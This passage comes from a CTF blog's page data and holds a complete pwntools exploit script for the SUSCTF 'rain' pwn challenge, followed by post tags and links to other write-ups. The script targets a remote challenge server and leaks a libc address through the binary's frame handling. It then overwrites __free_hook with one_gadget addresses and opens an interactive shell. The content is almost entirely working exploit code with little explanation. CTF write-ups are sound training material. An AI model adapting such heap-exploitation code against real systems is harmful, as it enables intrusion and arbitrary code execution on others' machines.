class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;DEBUG&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># io = process([&#x27;./ld-2.27.so&#x27;,&#x27;./rain&#x27;], env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc.so.6&#x27;, &quot;TERM&quot;:&quot;xterm&quot;&#125;)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;124.71.185.75&#x27;</span>,<span class=\"number\">9999</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">e = ELF(<span class=\"string\">&#x27;./rain&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">frame</span>(<span class=\"params\">sh, sw, font, color, rainfall, table1</span>):</span><br><span class=\"line\">    p = p32(sh)</span><br><span class=\"line\">    p += p32(sw)</span><br><span class=\"line\">    p += p8(font)</span><br><span class=\"line\">    p += p8(color)</span><br><span class=\"line\">    p += p32(rainfall)</span><br><span class=\"line\">    p += p32(<span class=\"number\">0xdeadbeaf</span>)</span><br><span class=\"line\">    p += table1</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">config</span>(<span class=\"params\">fra</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;ch&gt; &#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&#x27;FRAME&gt; &#x27;</span>, fra)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;ch&gt; &#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rain</span>():</span><br><span class=\"line\">    context.log_level=<span class=\"string\">&#x27;INFO&#x27;</span></span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&#x27;ch&gt; &#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">    context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\"></span><br><span class=\"line\">malloc_got = e.got[<span class=\"string\">&#x27;malloc&#x27;</span>]</span><br><span class=\"line\">log.info(<span class=\"built_in\">hex</span>(malloc_got))</span><br><span class=\"line\"></span><br><span class=\"line\">p1 = p64(<span class=\"number\">0x00000603000</span>)</span><br><span class=\"line\">p1 += <span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x20</span> - <span class=\"built_in\">len</span>(p1))</span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>, p1)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">rain()</span><br><span class=\"line\"><span class=\"comment\"># show()</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">show()   </span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class=\"line\">inp = io.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>, drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">inp = u64(inp)</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;_IO_2_1_stdout_:&quot;</span>+<span class=\"built_in\">hex</span>(inp))</span><br><span class=\"line\">libc_base = inp - libc.sym[<span class=\"string\">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;libc_base:&quot;</span>+<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\"></span><br><span class=\"line\">ogg = [<span class=\"number\">0x4f365</span>,<span class=\"number\">0x4f3c2</span>,<span class=\"number\">0x10a45c</span>]</span><br><span class=\"line\">malloc_hook = libc_base + libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">log.info(<span class=\"string\">&quot;malloc_hook:&quot;</span>+<span class=\"built_in\">hex</span>(malloc_hook))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">rain()</span><br><span class=\"line\">p = frame(<span class=\"number\">0x40</span>,<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x70</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">p = frame(<span class=\"number\">0x40</span>,<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">p = frame(<span class=\"number\">0x40</span>,<span class=\"number\">0x40</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\"></span><br><span class=\"line\">p1 = p64(malloc_hook)</span><br><span class=\"line\">p1 += <span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x70</span> - <span class=\"built_in\">len</span>(p1))</span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>, p1)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">rain()</span><br><span class=\"line\"></span><br><span class=\"line\">p = frame(<span class=\"number\">0x30</span>,<span class=\"number\">0x30</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>, <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x70</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\">rain()</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(<span class=\"string\">&quot;ogg:&quot;</span>+<span class=\"built_in\">hex</span>(ogg[<span class=\"number\">0</span>]+libc_base))</span><br><span class=\"line\">p1 = p64(ogg[<span class=\"number\">1</span>]+libc_base) * (<span class=\"number\">0x70</span> // <span class=\"number\">8</span>)</span><br><span class=\"line\">p = frame(<span class=\"number\">0x1</span>,<span class=\"number\">0x1</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>, p1)</span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">config(p)</span><br><span class=\"line\">p = frame(<span class=\"number\">0x1</span>,<span class=\"number\">0x1</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">config(p)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n","path":"/p/SUSCTF-wp/","permalink":"https://blog.csome.cc/p/SUSCTF-wp/","tags":[{"name":"CTF","_id":"cuidvZ3AUibcKOkbkNEMC3ltU","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":15},{"name":"Pwn","_id":"cuid9EjKHYI0JNtcQl-odZaE8","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":15},{"name":"SUSCTF","_id":"cuid5lSEN-LzkYSF9BHDi609h","slug":"SUSCTF","path":"tags/SUSCTF/","permalink":"https://blog.csome.cc/tags/SUSCTF/","length":1}],"categories":[],"prev":{"title":"[2022HFCTF] Pwn babygame","date":"2022-03-22T11:04:57.000Z","slug":"HFCTF-Pwn-babygame","published":true,"updated":"2025-10-28T08:00:40.755Z","_id":"cuidFeNnKMkv2fjYcFQUpdAK0","layout":"post","photos":[],"excerpt":"","path":"/p/HFCTF-Pwn-babygame/","permalink":"https://blog.csome.cc/p/HFCTF-Pwn-babygame/","__post":true},"next":{"title":"[TQLCTF]Pwn Tunbelievable_write wp","date":"2022-02-21T02:08:13.000Z","slug":"TqlCTF-unbelievable-write","published":true,"updated":"2025-10-28T08:00:40.759Z","_id":"cuidka_o2XzstorH3qLryb5c-","layout":"post","photos":[],"excerpt":"","path":"/p/TqlCTF-unbelievable-write/","permalink":"https://blog.csome.cc/p/TqlCTF-unbelievable-write/","__post":true},"__post":true}